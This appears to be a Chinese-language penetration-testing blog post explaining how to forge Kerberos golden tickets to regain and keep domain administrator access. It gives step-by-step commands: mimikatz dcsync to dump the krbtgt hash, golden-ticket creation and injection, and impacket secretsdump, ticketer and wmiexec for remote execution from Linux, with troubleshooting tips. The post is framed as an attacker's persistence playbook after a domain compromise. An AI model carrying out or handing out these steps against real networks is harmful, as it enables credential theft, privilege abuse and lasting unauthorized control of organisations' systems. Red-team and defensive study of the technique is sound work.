---
layout: post
title: Pass the Ticket——Golden Ticket
date: 2018-12-26 23:30:00
tags: 域渗透
categories: hack 
author: PythonPig
---
* content
{:toc}


### \#0x00 写在前面 
域渗透过程简单来说：搞定域内某机器—获取域管登录凭证—登录域控导出所有用户hash—完毕  
导出域管hash或明文密码后并不一定万事大吉，如果所有域管全部更改密码后我们之前的导出的hash和密码就没用了，如果我们还有域内机器普通用户的权限的话，可以通过本文的方法找回域管权限。今天主要聊一下在域渗透后期如何利用Kerberos认证过程中的问题来维持域权限。  

{:refdef: style="text-align: center;"}
![golden ticket](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/golden%20ticket.jpg?raw=true)
{: refdef}
图片来源于:https://image.slidesharecdn.com




### \#0x01 原理简介
在Kerberos认证过程中，用户的Ticket都是由Kerberos用户krbtgt的密码Hash生成的，如果获得了krbtgt的密码hash，则可以伪造任意用户的Ticket，当然我们关心的是域管的Ticket。  
详细的Kerberos认证过程和Pass the Ticket的过程参见【参考】部分。  


### \#0x02 Golden Ticket利用之mimikatz

##### 一、获取伪造Ticket所需数据
伪造Ticket所需的数据主要有  
1、krbtgt用户的nt hash  
2、域SID   
3、域内机器普通用户权限  

krbtgt的hash值可以在域控上通过mimikatz获取，在域控上执行如下命令  
```
mimikatz.exe "lsadump::dcsync /user:domain_name\krbtgt /domain:domain_name.com"
```
![get krbtgt hash](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/get%20krbtgt%20hash_1.jpg?raw=true)  

从上图中可以得到nt hash：30eefxxxxxxxxxxxxxxxxxxxxxxxcbc4e和域SID：S-1-5-21-xxxxxxxxx-xxxxxxxxxxx1-xxxxxxxxxxxxx  

##### 二、伪造Golden Ticket并导入——Pass the Ticket
使用非域管账户登录域内已控的机器，在该机器上伪造域管Ticket。  
1、首先查看下系统是否已有tgt  
```
mimikatz # kerberos::tgt
```
![have no tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/have%20no%20tgt.jpeg?raw=true) 
  
2、验证在没有tgt的情况下本地用户是否具有域管权限  
访问域内其他机器需要认证的共享文件  
![have no permission](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/have%20no%20permission_1.jpg?raw=true)  
没有访问的权限  

3、生成tgt  
这里以域domain_name 和拟伪造的域管AD_admin_user为例进行说明  
```
mimikatz # kerberos::golden /user:AD_admin_user /domain:domain_name /sid:S-1-5-21-168xxxxx-3676xxxxxx1-34xxxx0176 /krbtgt:30eef769c3xxxxxxxxxxxcbc4e /ticket:AD_admin_user.kiribi
```
命令执行完成后，将在本目录下生成文件AD_admin_user.kiribi  

4、导入tgt 
``` 
mimikatz # kerberos::ptt AD_admin_user.kiribi
```

5、查看导入是否成功  
```
mimikatz # kerberos::tgt
```
![import success](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/import%20success_1.jpg?raw=true) 
导入成功  

6、尝试访问域内其他机器上的文件  
```
dir \\vas-xxxxxx\c$
```
![success](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/success_1.jpg?raw=true) 
Pass the Ticket成功，可以以非域管账户执行域管命令，执行其他域管命令请参照【参考】  

### \#0x03 Golden Ticket利用之ticketer（跨平台利用）
在横向移动的过程中，使用mimikatz利用Golden Ticket时有以下限制：  
1、需要一台windows机器的权限且安装mimikatz  
2、使用mimikatz需要免杀  
在已控的可与域内主机（如域控）通信的linux机器上使用impacket的ticketer等工具可解决上面的问题。  

##### 一、需要的条件
* krbtgt account NT hash
* domain SID
* domain FQDN
* user to impersonate（一般选择域管）

用到的工具主要为impacket的ticketer.py  

##### 一、获取伪造Ticket所需数据
方法一（获取krbtgt hash）：  
```
secretsdump.py domainname/domain_admin_username@dc_ip -hashes domain_admin_username_lmhash:domain_admin_username_nthash -just-dc
```
方法二（获取krbtgt hash）：  
参见 [导出域内所有用户hash](https://pythonpig.github.io/2018/12/09/导出域内所有用户hash/)

方法三：  
```
mimikatz.exe "lsadump::dcsync /user:domain_name\krbtgt /domain:domain_name.com"
```

##### 二、伪造Golden Ticket
利用ticketer.py生成伪造的ticket  
```
ticketer.py -nthash krbtgt_account_NT_hash -domain-sid S-1-5-21-168xxxxxx-367xxxxxxx-3458xxxxx -domain domain_name user_to_impersonate
``` 
如  
```
ticketer.py -nthash 11111111111111111111111111111 -domain-sid S-1-5-21-11111111-222222222-33333333 -domain testdomainname Administrator
```
执行后生成user_to_impersonate.ccache
##### 三、导入并利用
```
1、export KRB5CCNAME=/absolute_path/user_to_impersonate.ccache
2、wmiexec.py -no-pass -k domain_name/user_to_impersonate@dc_hostname_or_dc_ip -dc-ip dc_ip
```
注意：  
1、这里的domain_name一定与生成ticket是用到的domain_name完全相同，否则会出现错误“[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)”  
2、这里的dc_hostname_or_dc_ip可以是目标主机的hostname也可以是目标主机的ip地址，使用ip地址是可能会出现错误“[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)”，此时应尝试使用目标主机的hostname，若发起攻击的linux无法解析hostname为ip地址时，请在/etc/hosts文件中添加ip地址和hostname的对应关系。  

impacket中的不少工具都支持上述方式利用Golden Ticket。  
注：因为利用Golden Ticket的这台linux机器并不是域内机器，与域控可能存在时间不同步的问题，一般当时间差大于5分钟时会发生"Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)"错误，解决办法如下：  
1、ntpdate dc_ip （与域控进行时间同步，域控一般作为ntp server）  
或  
2、获取域内主机或域控的时间,调整linux机器的时间与域控时间差在5分钟以内：date -s 20:08:00    

### \#0x04 参考
* [域渗透的金之钥匙](http://drops.wooyun.org/tips/9591)
* [域渗透——Pass The Ticket](http://drops.wooyun.org/tips/12159)
* [谈谈基于Kerberos的Windows Network Authentication[上篇]](http://www.cnblogs.com/artech/archive/2007/07/05/807492.html)
* [[原创]谈谈基于Kerberos的Windows Network Authentication - Part II](http://www.cnblogs.com/artech/archive/2007/07/07/809545.html)
* [敞开的地狱之门：Kerberos协议的滥用](https://www.freebuf.com/articles/system/45631.html)
* [How To Pass the Ticket Through SSH Tunnels](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)

